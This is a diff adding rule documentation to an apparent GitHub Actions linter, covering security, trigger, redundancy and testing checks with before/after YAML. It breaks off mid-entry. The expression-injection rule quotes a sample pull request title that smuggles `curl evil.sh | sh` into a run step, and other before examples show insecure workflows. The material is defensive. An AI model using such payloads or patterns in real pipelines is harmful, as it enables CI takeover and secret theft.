@@ -42,6 +42,35 @@ Presets: `recommended`, `strict`, `agentic`, `github`, `insights`, `all`.
 | [`packages/version-drift`](#packages-version-drift) | practice | warn | recommended, agentic |  | Workspace packages should declare each third-party dependency with the same version specifier. |
 | [`registries/ghcr`](#registries-ghcr) | policy | info | github |  | Container images built in CI should be published to GitHub Container Registry (ghcr.io). |
 | [`registries/github-npm`](#registries-github-npm) | policy | info | github |  | Internal scoped npm packages should be published to the GitHub npm registry (npm.pkg.github.com). |
+| [`security/env-file-injection`](#security-env-file-injection) | practice | error | recommended, agentic, strict |  | Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_OUTPUT`. |
+| [`security/excessive-permissions`](#security-excessive-permissions) | practice | warn | recommended, agentic, strict |  | Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, and never grant `write-all` or write access to code and pull requests on untrusted triggers. |
+| [`security/expression-injection`](#security-expression-injection) | practice | error | recommended, agentic, strict |  | Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code. |
+| [`security/install-scripts-privileged`](#security-install-scripts-privileged) | practice | warn | strict |  | Package installs in privileged workflows that hold secrets or a write token should pass `--ignore-scripts`. |
+| [`security/mutable-remote-ref`](#security-mutable-remote-ref) | practice | warn | recommended, agentic, strict |  | Tools installed straight from a git repository or `@latest` should be pinned to a commit SHA or release version. |
+| [`security/persisted-credentials`](#security-persisted-credentials) | practice | warn | recommended, agentic | yes | `actions/checkout` should set `persist-credentials: false` in jobs that upload the workspace or run pull request code with elevated privileges. |
+| [`security/privileged-cache-restore`](#security-privileged-cache-restore) | practice | warn | recommended, strict |  | Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment` should not restore or save dependency caches. |
+| [`security/secrets-bulk-expose`](#security-secrets-bulk-expose) | practice | error | recommended, agentic, strict |  | Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` or print secrets with `echo`/`printf`. |
+| [`security/untrusted-checkout`](#security-untrusted-checkout) | practice | error | recommended, agentic, strict |  | `pull_request_target` and `workflow_run` workflows must not check out the pull request's code and then execute it. |
+| [`triggers/workflow-run-chain`](#triggers-workflow-run-chain) | practice | info | agentic, strict |  | Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job. |
+| [`triggers/serialized-matrix`](#triggers-serialized-matrix) | practice | warn | agentic, strict |  | Avoid throttling a matrix with a `max-parallel` far below its number of legs. |
+| [`triggers/draft-pr-gating`](#triggers-draft-pr-gating) | practice | info | agentic, strict |  | Skip expensive pull request jobs while the pull request is still a draft. |
+| [`triggers/noisy-pr-types`](#triggers-noisy-pr-types) | practice | warn | recommended, agentic, strict |  | Do not re-run build and test workflows on pull request metadata events such as labels or edits. |
+| [`triggers/frequent-schedule`](#triggers-frequent-schedule) | practice | warn | recommended, agentic, strict |  | Avoid scheduled workflows that run more often than every 15 minutes. |
+| [`triggers/shard-fail-fast`](#triggers-shard-fail-fast) | practice | info | agentic, strict |  | Let sharded pull request test matrices stop early when one shard fails. |
+| [`triggers/missing-job-condition-matrix`](#triggers-missing-job-condition-matrix) | practice | info | agentic, strict |  | Gate matrix jobs on the workflow's existing change-detection job. |
+| [`redundancy/duplicate-setup-step`](#redundancy-duplicate-setup-step) | practice | warn | recommended, agentic, strict |  | A job should not run the same toolchain setup action twice with the same inputs. |
+| [`redundancy/repeated-job-setup`](#redundancy-repeated-job-setup) | insight | info | insights |  | Jobs that repeat the same leading setup steps could share a composite action. |
+| [`redundancy/rebuild-per-job`](#redundancy-rebuild-per-job) | practice | warn | agentic, strict |  | Several jobs in a workflow should not each rebuild the same project from scratch. |
+| [`redundancy/duplicate-command`](#redundancy-duplicate-command) | practice | info | strict |  | A job should not run the same non-trivial shell command more than once. |
+| [`redundancy/shadowed-env`](#redundancy-shadowed-env) | practice | info | recommended, strict | yes | A job or step should not redefine an environment variable to the value it already inherits. |
+| [`redundancy/toolchain-version-drift`](#redundancy-toolchain-version-drift) | practice | warn | agentic, strict |  | Workflows should agree on the toolchain version they install with each setup action. |
+| [`testing/playwright-browser-cache`](#testing-playwright-browser-cache) | practice | warn | recommended, agentic, strict |  | Jobs that download Playwright browsers should cache them or run in the Playwright container image. |
+| [`testing/tool-incremental-cache`](#testing-tool-incremental-cache) | practice | info | agentic, strict |  | ESLint, tsc and Jest should keep their incremental caches between CI runs. |
+| [`testing/watch-mode-in-ci`](#testing-watch-mode-in-ci) | practice | warn | recommended, agentic, strict |  | Test runners and compilers in CI should run once instead of in watch mode. |
+| [`testing/unconditional-debug-upload`](#testing-unconditional-debug-upload) | practice | info | agentic, strict | yes | Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail. |
+| [`testing/masked-failures`](#testing-masked-failures) | practice | warn | recommended, agentic, strict |  | Test failures should fail the job, not be silenced by `continue-on-error: true` or `\|\| true`. |
+| [`testing/cache-disabled-install`](#testing-cache-disabled-install) | practice | info | agentic, strict |  | Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps. |
+| [`testing/fixed-sleep`](#testing-fixed-sleep) | practice | warn | recommended, agentic, strict |  | Run steps should wait for services to become ready instead of sleeping for a fixed time. |
 
 ## Ruleset: workflow
 
@@ -1254,3 +1283,1079 @@ References:
 - <https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-npm-registry>
 - <https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-nodejs-packages#publishing-packages-to-github-packages>
 - <https://docs.npmjs.com/cli/v11/configuring-npm/package-json#publishconfig>
+
+## Ruleset: security
+
+<a id="security-env-file-injection"></a>
+
+### security/env-file-injection
+
+Attacker-controlled values must not be written to `$GITHUB_ENV`, `$GITHUB_PATH`, or `$GITHUB_OUTPUT`.
+
+**Why:** Lines written to `$GITHUB_ENV` become environment variables for every later step, and `$GITHUB_PATH` entries change which binaries run. A branch name or issue title containing a newline can append its own `NODE_OPTIONS=--require=...`, `LD_PRELOAD`, or `PATH` entry and take over subsequent steps, including ones holding secrets. Interpolated values written to `$GITHUB_OUTPUT` can likewise forge outputs consumed by later jobs.
+
+- Kind: practice; default severity: error; impact: high
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: echo "BRANCH=${{ github.head_ref }}" >> "$GITHUB_ENV"
+```
+
+After:
+
+```yaml
+- env:
+    HEAD_REF: ${{ github.head_ref }}
+  run: |
+    if [[ "$HEAD_REF" =~ ^[A-Za-z0-9._/-]+$ ]]; then echo "BRANCH=$HEAD_REF" >> "$GITHUB_OUTPUT"; fi
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks>
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands#setting-an-environment-variable>
+
+<a id="security-excessive-permissions"></a>
+
+### security/excessive-permissions
+
+Workflows should declare least-privilege `permissions:` for the `GITHUB_TOKEN`, and never grant `write-all` or write access to code and pull requests on untrusted triggers.
+
+**Why:** Without a `permissions:` block the token gets the repository or organization default, which on older repositories is read/write to almost every scope. Any compromised dependency, action, or injected script inherits that access. Declaring the scopes each job needs limits the blast radius; on `pull_request_target`, `issue_comment`, and `workflow_run`, where outside contributors influence what runs, write access to contents lets an attacker push code, and write access to pull requests or issues in a job that also runs untrusted code or input lets them approve changes or spam the tracker.
+
+- Kind: practice; default severity: warn; impact: high
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: make test
+```
+
+After:
+
+```yaml
+on: push
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - run: make test
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#permissions>
+- <https://docs.github.com/en/actions/concepts/security/github_token>
+- <https://docs.github.com/en/actions/reference/security/secure-use>
+
+<a id="security-expression-injection"></a>
+
+### security/expression-injection
+
+Attacker-controlled `${{ }}` values (titles, bodies, branch names, commit messages) must not be interpolated directly into `run:` scripts or `github-script` code.
+
+**Why:** Expressions are substituted into the script text before the shell or JavaScript runtime parses it, so a pull request title like `a"; curl evil.sh | sh; #` becomes code. The job then runs that code with its token and secrets. Passing the value through an environment variable makes it plain data that the script reads at run time.
+
+- Kind: practice; default severity: error; impact: high
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: echo "Title: ${{ github.event.pull_request.title }}"
+```
+
+After:
+
+```yaml
+- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "Title: $PR_TITLE"
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks>
+- <https://securitylab.github.com/resources/github-actions-untrusted-input/>
+
+<a id="security-install-scripts-privileged"></a>
+
+### security/install-scripts-privileged
+
+Package installs in privileged workflows that hold secrets or a write token should pass `--ignore-scripts`.
+
+**Why:** npm, yarn, and pnpm run `preinstall`/`install`/`postinstall` scripts from every dependency by default. In a job that triggers on `pull_request_target`, `workflow_run`, or `issue_comment` and also holds secrets or a writable token, a single compromised or attacker-controlled package can read those credentials during the install. Disabling lifecycle scripts, and running only the specific builds you need afterwards, keeps install-time code away from the credentials.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `strict`
+
+Before:
+
+```yaml
+on: pull_request_target
+permissions:
+  pull-requests: write
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - run: npm ci
+```
+
+After:
+
+```yaml
+on: pull_request_target
+permissions:
+  pull-requests: write
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - run: npm ci --ignore-scripts
+```
+
+References:
+
+- <https://docs.npmjs.com/cli/commands/npm-install#ignore-scripts>
+- <https://docs.github.com/en/actions/reference/security/secure-use>
+- <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>
+
+<a id="security-mutable-remote-ref"></a>
+
+### security/mutable-remote-ref
+
+Tools installed straight from a git repository or `@latest` should be pinned to a commit SHA or release version.
+
+**Why:** Installing from a branch (or a repository's default branch) runs whatever code that branch holds at the moment the job starts. A force-push, a compromised maintainer account, or a hijacked repository silently changes what CI executes, and the run cannot be reproduced later. Pinning to a full commit SHA or a released version makes the dependency immutable and reviewable.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: pip install git+https://github.com/example/tool.git@main
+```
+
+After:
+
+```yaml
+- run: pip install git+https://github.com/example/tool.git@3f1c2b9e8d7a6f5e4d3c2b1a09f8e7d6c5b4a392
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions>
+- <https://pip.pypa.io/en/stable/topics/vcs-support/>
+- <https://docs.npmjs.com/cli/configuring-npm/package-json#git-urls-as-dependencies>
+- <https://go.dev/ref/mod#go-install>
+- <https://doc.rust-lang.org/cargo/commands/cargo-install.html>
+
+<a id="security-persisted-credentials"></a>
+
+### security/persisted-credentials
+
+`actions/checkout` should set `persist-credentials: false` in jobs that upload the workspace or run pull request code with elevated privileges.
+
+**Why:** By default `actions/checkout` writes the job's token into `.git/config` so later git commands can authenticate. Any later step can read it, and an artifact that includes the `.git` directory publishes it to anyone who can download the artifact. When the job does not push, disabling credential persistence removes the token from disk entirely.
+
+- Kind: practice; default severity: warn; impact: medium; autofix available
+- Presets: `recommended`, `agentic`
+
+Before:
+
+```yaml
+- uses: actions/checkout@v5
+- uses: actions/upload-artifact@v4
+  with:
+    path: .
+    include-hidden-files: true
+```
+
+After:
+
+```yaml
+- uses: actions/checkout@v5
+  with:
+    persist-credentials: false
+- uses: actions/upload-artifact@v4
+  with:
+    path: .
+    include-hidden-files: true
+```
+
+References:
+
+- <https://github.com/actions/checkout#usage>
+- <https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions>
+- <https://github.com/actions/upload-artifact#uploading-hidden-files>
+
+<a id="security-privileged-cache-restore"></a>
+
+### security/privileged-cache-restore
+
+Workflows triggered by `pull_request_target`, `workflow_run`, or `issue_comment` should not restore or save dependency caches.
+
+**Why:** The Actions cache is shared across workflows on the same branch scope. A cache entry written by untrusted code (for example a pull request build on the default branch's scope, or a privileged job that ran contributor code) can be restored into a privileged job, which then executes the poisoned binaries with secrets and a write token. Privileged workflows should build from clean inputs.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `recommended`, `strict`
+
+Before:
+
+```yaml
+on: pull_request_target
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v5
+        with:
+          cache: npm
+```
+
+After:
+
+```yaml
+on: pull_request_target
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/setup-node@v5
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching#restrictions-for-accessing-a-cache>
+- <https://docs.github.com/en/actions/reference/security/secure-use>
+- <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>
+
+<a id="security-secrets-bulk-expose"></a>
+
+### security/secrets-bulk-expose
+
+Workflows must not serialize the whole `secrets` context with `toJSON(secrets)` or print secrets with `echo`/`printf`.
+
+**Why:** `toJSON(secrets)` hands every repository and organization secret to a single step, so one compromised action or script leaks all of them; it also defeats per-job least privilege. Printing a secret relies entirely on log masking, which misses transformed values (base64, substrings, JSON escapes) and leaves the value in step summaries or downstream tools. Pass only the specific secrets a step needs through `env:` and never write them to stdout.
+
+- Kind: practice; default severity: error; impact: high
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- env:
+    ALL_SECRETS: ${{ toJSON(secrets) }}
+  run: ./deploy.sh
+```
+
+After:
+
+```yaml
+- env:
+    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
+  run: ./deploy.sh
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/security/secure-use#use-secrets-for-sensitive-information>
+- <https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions>
+
+<a id="security-untrusted-checkout"></a>
+
+### security/untrusted-checkout
+
+`pull_request_target` and `workflow_run` workflows must not check out the pull request's code and then execute it.
+
+**Why:** These triggers run in the base repository's context with its secrets and a token that can write. Checking out the contributor's head commit and then running a build, test, script, or local action executes attacker-authored code with those privileges (a "pwn request"). Run untrusted code in a `pull_request` workflow instead, and hand results to the privileged workflow as data.
+
+- Kind: practice; default severity: error; impact: high
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+on: pull_request_target
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm ci && npm test
+```
+
+After:
+
+```yaml
+on: pull_request
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - uses: actions/checkout@v5
+      - run: npm ci && npm test
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request_target>
+- <https://docs.github.com/en/actions/reference/security/secure-use>
+- <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>
+
+## Ruleset: triggers
+
+<a id="triggers-workflow-run-chain"></a>
+
+### triggers/workflow-run-chain
+
+Avoid chaining workflows with `workflow_run` when the downstream work could be a dependent job.
+
+**Why:** A `workflow_run` trigger only fires after the upstream workflow finishes, so the downstream work waits for a second queue slot, a fresh runner, and another checkout before it starts. When pull request volume is high those extra hops add minutes to every change and make the run graph harder to follow. Calling the downstream work as a reusable workflow job with `needs:` keeps it in the same run, shares artifacts directly, and starts it the moment its dependencies succeed.
+
+- Kind: practice; default severity: info; impact: medium
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+# deploy.yml
+on:
+  workflow_run:
+    workflows: [CI]
+    types: [completed]
+```
+
+After:
+
+```yaml
+# ci.yml
+jobs:
+  test: ...
+  deploy:
+    needs: test
+    uses: ./.github/workflows/deploy.yml
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_run>
+- <https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows>
+
+<a id="triggers-serialized-matrix"></a>
+
+### triggers/serialized-matrix
+
+Avoid throttling a matrix with a `max-parallel` far below its number of legs.
+
+**Why:** A matrix exists to fan work out across runners. Setting `strategy.max-parallel` to 1, or to a small fraction of the matrix size, turns that fan-out back into a queue: wall-clock time grows with every leg while the total minutes billed stay the same. When agents open many pull requests, that latency stacks up across every change. Serializing is only worth it when legs genuinely contend for a shared resource, which is better expressed with `concurrency` or an environment.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `agentic`, `strict`
+- Options: `maxRatio` (default `4`)
+
+Before:
+
+```yaml
+strategy:
+  max-parallel: 1
+  matrix:
+    node: [18, 20, 22]
+```
+
+After:
+
+```yaml
+strategy:
+  matrix:
+    node: [18, 20, 22]
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstrategymax-parallel>
+- <https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/run-job-variations>
+
+<a id="triggers-draft-pr-gating"></a>
+
+### triggers/draft-pr-gating
+
+Skip expensive pull request jobs while the pull request is still a draft.
+
+**Why:** Coding agents typically open a draft pull request early and push many intermediate commits before asking for review. Every push re-runs the full pull request workflow, so matrices and long suites burn minutes on work nobody will look at yet. Gating the expensive jobs on `github.event.pull_request.draft == false` and listening for `ready_for_review` keeps fast feedback on drafts while running the heavy checks exactly once the change is ready.
+
+- Kind: practice; default severity: info; impact: medium
+- Presets: `agentic`, `strict`
+- Options: `maxSteps` (default `10`), `maxTimeout` (default `15`)
+
+Before:
+
+```yaml
+on: pull_request
+jobs:
+  test:
+    strategy:
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+```
+
+After:
+
+```yaml
+on:
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review]
+jobs:
+  test:
+    if: github.event.pull_request.draft == false
+    strategy:
+      matrix:
+        os: [ubuntu-latest, windows-latest]
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request>
+- <https://docs.github.com/en/webhooks/webhook-events-and-payloads#pull_request>
+
+<a id="triggers-noisy-pr-types"></a>
+
+### triggers/noisy-pr-types
+
+Do not re-run build and test workflows on pull request metadata events such as labels or edits.
+
+**Why:** Activity types like `edited`, `labeled`, and `assigned` fire when a title, label, or assignee changes, not when code changes. Build and test workflows that listen for them repeat identical work on the same commit, and triage bots or agents that relabel pull requests can trigger several full runs in a row. Listening only for code activity, or filtering the jobs on the specific action or label, keeps those events cheap.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+on:
+  pull_request:
+    types: [opened, synchronize, edited, labeled]
+```
+
+After:
+
+```yaml
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#pull_request>
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/contexts#github-context>
+
+<a id="triggers-frequent-schedule"></a>
+
+### triggers/frequent-schedule
+
+Avoid scheduled workflows that run more often than every 15 minutes.
+
+**Why:** A cron schedule runs whether or not anything changed, so a workflow that fires every few minutes spends runner time around the clock and competes with pull request checks for the same concurrency pool. GitHub also delays or drops scheduled runs during periods of high load, so very tight schedules rarely deliver the freshness they promise. Event triggers such as `push`, `workflow_dispatch`, or `repository_dispatch` react to real changes; when polling is unavoidable, a 15-minute or longer interval is usually enough.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `recommended`, `agentic`, `strict`
+- Options: `maxRunsPerHour` (default `4`)
+
+Before:
+
+```yaml
+on:
+  schedule:
+    - cron: '*/5 * * * *'
+```
+
+After:
+
+```yaml
+on:
+  schedule:
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#schedule>
+
+<a id="triggers-shard-fail-fast"></a>
+
+### triggers/shard-fail-fast
+
+Let sharded pull request test matrices stop early when one shard fails.
+
+**Why:** When a test suite is split into shards, each leg runs a slice of the same suite against the same commit. With `fail-fast: false`, a failure in one shard still lets every other shard run to completion, even though the pull request is already red and will need another push. Keeping the default `fail-fast: true` on pull requests cancels the remaining shards and returns those minutes to the queue, which matters most when many agent-authored pull requests are iterating at once.
+
+- Kind: practice; default severity: info; impact: medium
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+strategy:
+  fail-fast: false
+  matrix:
+    shard: [1, 2, 3, 4]
+```
+
+After:
+
+```yaml
+strategy:
+  fail-fast: ${{ github.event_name != 'pull_request' }}
+  matrix:
+    shard: [1, 2, 3, 4]
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstrategyfail-fast>
+
+<a id="triggers-missing-job-condition-matrix"></a>
+
+### triggers/missing-job-condition-matrix
+
+Gate matrix jobs on the workflow's existing change-detection job.
+
+**Why:** When a workflow already computes which paths a pull request touched and uses that result to skip some jobs, a matrix job that ignores it runs every leg on every pull request, including documentation-only or unrelated changes. Matrices are the most expensive jobs in a workflow, so they gain the most from the same gate. Adding the change job to `needs:` and an `if:` on its outputs lets the matrix skip cleanly when its inputs did not change.
+
+- Kind: practice; default severity: info; impact: medium
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+jobs:
+  changes: ...
+  lint:
+    needs: changes
+    if: needs.changes.outputs.src == 'true'
+  test:
+    strategy:
+      matrix:
+        node: [18, 20, 22]
+```
+
+After:
+
+```yaml
+jobs:
+  changes: ...
+  test:
+    needs: changes
+    if: needs.changes.outputs.src == 'true'
+    strategy:
+      matrix:
+        node: [18, 20, 22]
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idif>
+- <https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/pass-job-outputs>
+
+## Ruleset: redundancy
+
+<a id="redundancy-duplicate-setup-step"></a>
+
+### redundancy/duplicate-setup-step
+
+A job should not run the same toolchain setup action twice with the same inputs.
+
+**Why:** Running a setup action a second time with identical inputs reinstalls the same toolchain, adds download and cache-restore time to every run, and usually signals a copy-paste mistake that hides which configuration is authoritative.
+
+- Kind: practice; default severity: warn; impact: low
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+steps:
+  - uses: actions/setup-node@v4
+    with:
+      node-version: 22
+  - run: npm ci
+  - uses: actions/setup-node@v4
+    with:
+      node-version: 22
+```
+
+After:
+
+```yaml
+steps:
+  - uses: actions/setup-node@v4
+    with:
+      node-version: 22
+  - run: npm ci
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idsteps>
+
+<a id="redundancy-repeated-job-setup"></a>
+
+### redundancy/repeated-job-setup
+
+Jobs that repeat the same leading setup steps could share a composite action.
+
+**Why:** When many jobs open with the same checkout, toolchain, and install steps, every change to that setup (a new cache key, an action upgrade, a registry login) has to be made in each copy. Copies drift, and drifted setup is a common source of 'works in one job, fails in another'. A local composite action keeps one definition.
+
+- Kind: insight; default severity: info; impact: low
+- Presets: `insights`
+- Options: `minJobs` (default `3`), `minSteps` (default `3`)
+
+Before:
+
+```yaml
+jobs:
+  lint:
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+      - run: npm ci
+      - run: npm run lint
+  test:
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+      - run: npm ci
+      - run: npm test
+  build:
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+      - run: npm ci
+      - run: npm run build
+```
+
+After:
+
+```yaml
+jobs:
+  lint:
+    steps:
+      - uses: actions/checkout@v4
+      - uses: ./.github/actions/setup
+      - run: npm run lint
+```
+
+References:
+
+- <https://docs.github.com/en/actions/sharing-automations/creating-actions/creating-a-composite-action>
+
+<a id="redundancy-rebuild-per-job"></a>
+
+### redundancy/rebuild-per-job
+
+Several jobs in a workflow should not each rebuild the same project from scratch.
+
+**Why:** When multiple jobs run the same build command on the same runner type, the workflow pays for the build several times and the jobs may test or ship slightly different outputs. Building once and passing the result through an artifact cuts runner minutes and guarantees every downstream job uses the same bits.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+jobs:
+  test:
+    steps:
+      - run: npm run build
+      - run: npm test
+  e2e:
+    steps:
+      - run: npm run build
+      - run: npm run e2e
+```
+
+After:
+
+```yaml
+jobs:
+  build:
+    steps:
+      - run: npm run build
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dist
+          path: dist
+  e2e:
+    needs: build
+    steps:
+      - uses: actions/download-artifact@v4
+        with:
+          name: dist
+      - run: npm run e2e
+```
+
+References:
+
+- <https://docs.github.com/en/actions/tutorials/store-and-share-data>
+
+<a id="redundancy-duplicate-command"></a>
+
+### redundancy/duplicate-command
+
+A job should not run the same non-trivial shell command more than once.
+
+**Why:** Repeating an install, build, or test command in one job repeats its cost on every run. It is usually left over from merging two step lists and makes it unclear which invocation the job actually depends on.
+
+- Kind: practice; default severity: info; impact: low
+- Presets: `strict`
+
+Before:
+
+```yaml
+steps:
+  - run: npm ci
+  - run: npm test
+  - run: npm ci
+```
+
+After:
+
+```yaml
+steps:
+  - run: npm ci
+  - run: npm test
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idstepsrun>
+
+<a id="redundancy-shadowed-env"></a>
+
+### redundancy/shadowed-env
+
+A job or step should not redefine an environment variable to the value it already inherits.
+
+**Why:** Workflow-level `env` is inherited by every job and step. Repeating the same `KEY: value` lower down adds noise and creates a second copy that must be changed in lockstep; when only one copy is updated, the inner one silently wins.
+
+- Kind: practice; default severity: info; impact: low; autofix available
+- Presets: `recommended`, `strict`
+
+Before:
+
+```yaml
+env:
+  NODE_ENV: test
+jobs:
+  test:
+    env:
+      NODE_ENV: test
+```
+
+After:
+
+```yaml
+env:
+  NODE_ENV: test
+jobs:
+  test:
+    runs-on: ubuntu-24.04
+```
+
+References:
+
+- <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#env>
+
+<a id="redundancy-toolchain-version-drift"></a>
+
+### redundancy/toolchain-version-drift
+
+Workflows should agree on the toolchain version they install with each setup action.
+
+**Why:** When one workflow installs Node 20 and another Node 22, or Python 3.11 versus 3.12, CI validates on one runtime and releases on another. These pins are usually updated one file at a time, so they drift. A single version file read by every setup step keeps them aligned. This covers language toolchains installed by setup actions, not package dependency versions.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+# ci.yml
+- uses: actions/setup-node@v4
+  with:
+    node-version: 20
+# release.yml
+- uses: actions/setup-node@v4
+  with:
+    node-version: 22
+```
+
+After:
+
+```yaml
+# ci.yml and release.yml
+- uses: actions/setup-node@v4
+  with:
+    node-version-file: .nvmrc
+```
+
+References:
+
+- <https://github.com/actions/setup-node/blob/main/docs/advanced-usage.md#node-version-file>
+
+## Ruleset: testing
+
+<a id="testing-playwright-browser-cache"></a>
+
+### testing/playwright-browser-cache
+
+Jobs that download Playwright browsers should cache them or run in the Playwright container image.
+
+**Why:** `playwright install` downloads several hundred megabytes of browser builds on every run. Restoring ~/.cache/ms-playwright keyed on the Playwright version (or using the image that ships the browsers) turns that download into a cache hit.
+
+- Kind: practice; default severity: warn; impact: medium
+- Presets: `recommended`, `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: npm ci
+- run: npx playwright install --with-deps
+- run: npx playwright test
+```
+
+After:
+
+```yaml
+- run: npm ci
+- uses: actions/cache@v4
+  with:
+    path: ~/.cache/ms-playwright
+    key: playwright-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
+- run: npx playwright install --with-deps
+- run: npx playwright test
+```
+
+References:
+
+- <https://playwright.dev/docs/ci>
+- <https://playwright.dev/docs/browsers#managing-browser-binaries>
+- <https://github.com/actions/cache>
+
+<a id="testing-tool-incremental-cache"></a>
+
+### testing/tool-incremental-cache
+
+ESLint, tsc and Jest should keep their incremental caches between CI runs.
+
+**Why:** ESLint (`--cache`), TypeScript (`incremental`/`tsc -b`) and Jest (transform cache) can skip unchanged files, but hosted runners start empty. Persisting their cache files makes repeat runs, including agent iterations on a pull request, proportional to what changed.
+
+- Kind: practice; default severity: info; impact: low
+- Presets: `agentic`, `strict`
+
+Before:
+
+```yaml
+- run: npm ci
+- run: npx eslint .
+```
+
+After:
+
+```yaml
+- run: npm ci
+- uses: actions/cache@v4
+  with:
+    path: node_modules/.cache/eslint
+    key: eslint-${{ hashFiles('package-lock.json') }}-${{ github.sha }}
+    restore-keys: eslint-${{ hashFiles('package-lock.json') }}-
+- run: npx eslint . --cache --cache-location node_modules/.cache/eslint/
+```
+
+References:
+
+- <https://eslint.org/docs/latest/use/command-line-interface#caching>
+- <https://www.typescriptlang.org/tsconfig/#incremental>
+- <https://jestjs.io/docs/cli#--cachedirectory>
+- <https://github.com/actions/cache>
+
+<a id="testing-watch-mode-in-ci"></a>
+
+### testing/watch-mode-in-ci
+
+Test runners and compilers in CI should run once instead of in watch mode.
+
+**Why:** A watcher never exits on its own: `jest --watch`, `vitest watch`, `karma start` or `ng test` without single-run keeps the job alive until the job timeout (six hours by default), burning runner minutes and blocking the merge signal.
+
+- Kind: practice; default severity: warn; impact: high
